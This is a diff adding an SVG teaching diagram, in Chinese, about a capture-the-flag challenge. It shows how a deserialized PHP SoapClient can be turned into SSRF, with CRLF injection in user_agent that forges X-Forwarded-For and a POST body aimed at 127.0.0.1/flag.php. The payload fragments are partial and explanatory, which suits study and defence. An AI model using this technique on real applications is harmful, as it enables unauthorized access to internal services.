@@ -1,0 +1,79 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="960" height="640" viewBox="0 0 960 640" font-family="'Microsoft YaHei','PingFang SC',sans-serif">
+  <defs>
+    <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+      <path d="M0,0 L0,6 L9,3 z" fill="#4b5563"/>
+    </marker>
+    <marker id="arrowRed" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+      <path d="M0,0 L0,6 L9,3 z" fill="#dc2626"/>
+    </marker>
+  </defs>
+
+  <rect width="960" height="640" fill="#fafafa"/>
+
+  <text x="480" y="30" text-anchor="middle" font-size="19" font-weight="bold" fill="#111827">SoapClient 反序列化：一次「调不存在的方法」换来服务器自己发请求</text>
+  <text x="480" y="52" text-anchor="middle" font-size="12.5" fill="#6b7280">不构造 SOAP XML，只利用 SoapClient 内置的 __call() —— 报文由攻击者定制、请求由服务器发出，等价 SSRF</text>
+
+  <!-- ===== 左侧主流程 ===== -->
+  <rect x="40" y="86" width="500" height="52" rx="8" fill="#eff6ff" stroke="#3b82f6" stroke-width="1.4"/>
+  <text x="290" y="108" text-anchor="middle" font-size="13" font-weight="bold" fill="#1e3a8a">① 攻击者构造 SoapClient 对象</text>
+  <text x="290" y="126" text-anchor="middle" font-size="11.5" font-family="Consolas,monospace" fill="#1d4ed8">new SoapClient(null, ['location'=>..., 'uri'=>..., 'user_agent'=>...])</text>
+
+  <path d="M290,138 L290,154" stroke="#4b5563" stroke-width="2" marker-end="url(#arrow)" fill="none"/>
+
+  <rect x="40" y="156" width="500" height="52" rx="8" fill="#eff6ff" stroke="#3b82f6" stroke-width="1.4"/>
+  <text x="290" y="178" text-anchor="middle" font-size="13" font-weight="bold" fill="#1e3a8a">② unserialize($_GET['vip']) 恢复对象</text>
+  <text x="290" y="196" text-anchor="middle" font-size="11.5" fill="#1d4ed8">payload 里的 location / uri / user_agent 原样写回属性</text>
+
+  <path d="M290,208 L290,224" stroke="#4b5563" stroke-width="2" marker-end="url(#arrow)" fill="none"/>
+
+  <rect x="40" y="226" width="500" height="52" rx="8" fill="#fef9c3" stroke="#eab308" stroke-width="1.5"/>
+  <text x="290" y="248" text-anchor="middle" font-size="13" font-weight="bold" fill="#713f12">③ 业务代码调用 $vip-&gt;getFlag()</text>
+  <text x="290" y="266" text-anchor="middle" font-size="11.5" fill="#854d0e">SoapClient 上并没有 getFlag() 这个方法 → PHP 去找 __call()</text>
+
+  <path d="M290,278 L290,294" stroke="#4b5563" stroke-width="2" marker-end="url(#arrow)" fill="none"/>
+
+  <rect x="40" y="296" width="500" height="52" rx="8" fill="#fee2e2" stroke="#ef4444" stroke-width="1.6"/>
+  <text x="290" y="318" text-anchor="middle" font-size="13" font-weight="bold" fill="#991b1b">④ SoapClient::__call("getFlag", [])</text>
+  <text x="290" y="336" text-anchor="middle" font-size="11.5" fill="#b91c1c">__call() 是 SoapClient 自带的：把方法名当远程接口，构造并发送 HTTP 请求</text>
+
+  <path d="M290,348 L290,364" stroke="#4b5563" stroke-width="2" marker-end="url(#arrow)" fill="none"/>
+
+  <rect x="40" y="366" width="500" height="52" rx="8" fill="#fee2e2" stroke="#ef4444" stroke-width="1.6"/>
+  <text x="290" y="388" text-anchor="middle" font-size="13" font-weight="bold" fill="#991b1b">⑤ 以 location 为目标、user_agent 为报文发请求</text>
+  <text x="290" y="406" text-anchor="middle" font-size="11.5" font-family="Consolas,monospace" fill="#b91c1c">location = http://127.0.0.1/flag.php</text>
+
+  <path d="M290,418 L290,434" stroke="#dc2626" stroke-width="2" marker-end="url(#arrowRed)" fill="none"/>
+
+  <rect x="40" y="436" width="500" height="52" rx="8" fill="#dcfce7" stroke="#22c55e" stroke-width="1.6"/>
+  <text x="290" y="458" text-anchor="middle" font-size="13" font-weight="bold" fill="#14532d">⑥ 请求以「本机」身份命中内网接口</text>
+  <text x="290" y="476" text-anchor="middle" font-size="11.5" fill="#166534">伪造 X-Forwarded-For: 127.0.0.1 + 带 token → flag.txt 被写出</text>
+
+  <!-- ===== 右侧面板：user_agent CRLF 注入 ===== -->
+  <rect x="566" y="86" width="354" height="402" rx="10" fill="#fff7ed" stroke="#f59e0b" stroke-width="1.5"/>
+  <text x="586" y="112" font-size="13.5" font-weight="bold" fill="#78350f">武器其实在 user_agent 里</text>
+  <text x="586" y="133" font-size="11.5" fill="#92400e">它被原样拼进 HTTP 头，于是可以用 \r\n</text>
+  <text x="586" y="150" font-size="11.5" fill="#92400e">「续写」任意请求头、再接上请求体。</text>
+
+  <rect x="586" y="166" width="314" height="150" rx="6" fill="#ffffff" stroke="#fbbf24" stroke-width="1.2"/>
+  <text x="598" y="186" font-size="11" font-family="Consolas,monospace" fill="#7c2d12">$ua = "ctfshow\r\n"</text>
+  <text x="598" y="204" font-size="11" font-family="Consolas,monospace" fill="#7c2d12">  . "x-forwarded-for:127.0.0.1\r\n"</text>
+  <text x="598" y="222" font-size="11" font-family="Consolas,monospace" fill="#7c2d12">  . "Content-Type:...\r\n"</text>
+  <text x="598" y="240" font-size="11" font-family="Consolas,monospace" fill="#7c2d12">  . "Content-Length:13\r\n"</text>
+  <text x="598" y="258" font-size="11" font-family="Consolas,monospace" fill="#7c2d12">  . "\r\n"                 &lt;- 空行</text>
+  <text x="598" y="276" font-size="11" font-family="Consolas,monospace" fill="#7c2d12">  . "token=ctfshow";        &lt;- body</text>
+
+  <text x="586" y="336" font-size="11.5" fill="#92400e">拼出来的报文（示意）：</text>
+  <rect x="586" y="346" width="314" height="126" rx="6" fill="#fffbeb" stroke="#fcd34d" stroke-width="1.1"/>
+  <text x="598" y="366" font-size="10.5" font-family="Consolas,monospace" fill="#78350f">GET /flag.php HTTP/1.1</text>
+  <text x="598" y="382" font-size="10.5" font-family="Consolas,monospace" fill="#78350f">Host: 127.0.0.1</text>
+  <text x="598" y="398" font-size="10.5" font-family="Consolas,monospace" fill="#78350f">User-Agent: ctfshow</text>
+  <text x="598" y="414" font-size="10.5" font-family="Consolas,monospace" fill="#b91c1c">x-forwarded-for:127.0.0.1</text>
+  <text x="598" y="430" font-size="10.5" font-family="Consolas,monospace" fill="#78350f">Content-Length:13</text>
+  <text x="598" y="450" font-size="10.5" font-family="Consolas,monospace" fill="#b91c1c">token=ctfshow</text>
+
+  <!-- ===== 底部结论条 ===== -->
+  <rect x="130" y="524" width="700" height="88" rx="10" fill="#f1f5f9" stroke="#64748b" stroke-width="1.4"/>
+  <text x="480" y="548" text-anchor="middle" font-size="13" font-weight="bold" fill="#0f172a">对照 SSRF：谁在发请求？</text>
+  <text x="480" y="570" text-anchor="middle" font-size="11.5" fill="#334155">普通 SSRF 用 curl / file_get_contents 发请求；本题把「发请求的工具」换成了内置类 SoapClient。</text>
+  <text x="480" y="590" text-anchor="middle" font-size="11.5" fill="#334155">目标地址、请求头、请求体全部由 payload 决定，请求却由服务器进程发出 —— 这就是 SSRF 的定义。</text>
+</svg>
